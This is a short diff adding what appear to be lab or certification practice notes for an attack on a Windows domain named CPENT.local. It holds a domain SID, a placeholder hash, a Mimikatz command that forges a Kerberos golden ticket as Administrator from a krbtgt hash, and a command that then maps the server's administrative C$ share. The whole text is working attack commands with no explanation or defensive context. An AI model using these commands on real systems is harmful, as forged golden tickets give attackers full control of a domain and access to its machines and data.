@@ -1,0 +1,8 @@
+S-1-5-21-2393717600-3563179943-2111292666
+
+deadbeefboobbabe003133700009999
+
+kerberos::golden /admin:Administrator /domain:CPENT.local /sid:S-1-5-21-2393717600-3563179943-2111292666 /krbtgt:deadbeefbootooee0031337000099999 /ticket:Administrator:kevin
+
+
+net use j: \\server-one.CPENT.local\c$
